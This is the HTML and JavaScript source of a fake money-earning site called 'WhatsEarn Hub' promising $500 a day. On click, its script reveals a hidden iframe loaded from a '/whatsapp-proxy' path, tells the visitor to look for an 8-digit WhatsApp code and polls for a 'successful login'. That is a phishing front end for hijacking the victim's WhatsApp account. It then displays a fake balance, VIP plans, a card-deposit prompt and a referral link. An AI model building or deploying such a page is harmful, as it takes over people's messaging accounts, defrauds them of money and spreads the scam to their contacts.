<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsEarn Hub - Earn $500 Daily</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #00d4aa 0%, #00a085 50%, #ffd700 100%);
            min-height: 100vh;
        }
        .whatsapp-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            opacity: 0;
            pointer-events: none;
        }
        .dashboard {
            position: relative;
            z-index: 2;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
        }
        .glass {
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(16px);
            border-radius: 32px;
            padding: 32px 24px;
            text-align: center;
            margin-bottom: 20px;
        }
        .logo { font-size: 2.4em; font-weight: 800; color: #ffd700; margin-bottom: 12px; }
        .bonus-badge {
            background: linear-gradient(105deg, #FFB347, #FF6B35);
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1.4rem;
            font-weight: 800;
            display: inline-block;
            margin: 20px 0;
            animation: pulse 1.8s infinite;
        }
        @keyframes pulse {
            0%,100%{transform:scale(1);}
            50%{transform:scale(1.05);}
        }
        .wa-btn {
            background: linear-gradient(105deg, #25D366, #128C7E);
            color: white;
            border: none;
            padding: 16px 28px;
            border-radius: 60px;
            font-size: 1.2rem;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        .plans {
            background: rgba(0,0,0,0.2);
            border-radius: 32px;
            padding: 24px;
        }
        .plan {
            background: rgba(255,255,255,0.2);
            padding: 12px 18px;
            border-radius: 28px;
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
        }
        .plan-price { color: #FFE484; font-weight: 700; font-size: 1.3rem; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #128C7E;
            color: white;
            padding: 12px 24px;
            border-radius: 40px;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <iframe id="whatsappFrame" class="whatsapp-iframe" src="/whatsapp-proxy"></iframe>
    
    <div class="dashboard">
        <div class="glass" id="mainCard">
            <div class="logo">💸 WhatsEarn Hub</div>
            <h1 style="color:white;">Earn Real Dollars!</h1>
            <div class="bonus-badge">✨ $5 INSTANT BONUS ✨</div>
            <button class="wa-btn" id="connectBtn">
                <i class="fab fa-whatsapp"></i> Connect WhatsApp & Get $5
            </button>
            <p style="color:white; font-size:12px;" id="statusMsg"></p>
        </div>
        
        <div class="plans">
            <h3 style="color:white;">VIP Earning Plans</h3>
            <div class="plan"><span>🥈 Silver Plan</span><span class="plan-price">$5</span></div>
            <div class="plan"><span>🥇 Gold Plan</span><span class="plan-price">$15</span></div>
            <div class="plan"><span>💎 Platinum</span><span class="plan-price">$30</span></div>
            <div class="plan"><span>👑 Diamond</span><span class="plan-price">$75</span></div>
            <div class="plan"><span>⭐ Elite VIP</span><span class="plan-price">$150</span></div>
        </div>
    </div>

    <script>
        let isConnected = false;
        
        document.getElementById('connectBtn').addEventListener('click', () => {
            if(isConnected) return;
            document.getElementById('statusMsg').innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Connecting... Check WhatsApp on your phone';
            document.getElementById('connectBtn').disabled = true;
            
            const iframe = document.getElementById('whatsappFrame');
            iframe.style.opacity = '1';
            iframe.style.pointerEvents = 'none';
            
            showToast("📱 Check WhatsApp on your phone for 8-digit code");
            
            // Check for successful login
            const checkInterval = setInterval(async () => {
                try {
                    const res = await fetch('/api/check-status');
                    const data = await res.json();
                    if (data.success) {
                        clearInterval(checkInterval);
                        updateDashboard();
                    }
                } catch(e) {}
            }, 3000);
        });
        
        function updateDashboard() {
            isConnected = true;
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div class="logo">💸 WhatsEarn Hub</div>
                <div style="background:rgba(0,0,0,0.3);border-radius:24px;padding:20px;margin:15px 0;">
                    <h2 style="color:#ffd700;font-size:2.5rem;">$5.47</h2>
                    <p style="color:white;">Available Balance</p>
                </div>
                <button class="wa-btn" id="depositBtn" style="background:#ff6b35;"><i class="fas fa-credit-card"></i> Deposit Money</button>
                <button class="wa-btn" id="withdrawBtn" style="background:#128C7E;"><i class="fas fa-wallet"></i> Withdraw to EasyPaisa</button>
                <button class="wa-btn" id="referBtn" style="background:#25D366;"><i class="fas fa-share-alt"></i> Refer & Earn $2</button>
                <div style="background:#25D366;border-radius:40px;padding:8px;margin-top:15px;color:white;">✅ WhatsApp Connected!</div>
            `;
            
            document.getElementById('depositBtn')?.addEventListener('click', () => showToast("💳 Deposit form - Card details required"));
            document.getElementById('withdrawBtn')?.addEventListener('click', () => showToast("💰 Withdrawal to EasyPaisa/JazzCash"));
            document.getElementById('referBtn')?.addEventListener('click', () => {
                navigator.clipboard.writeText(window.location.href);
                showToast("✅ Referral link copied!");
            });
            
            showToast("🎉 $5 Bonus Added! Welcome!");
        }
        
        function showToast(msg) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 4000);
        }
    </script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</body>
</html>
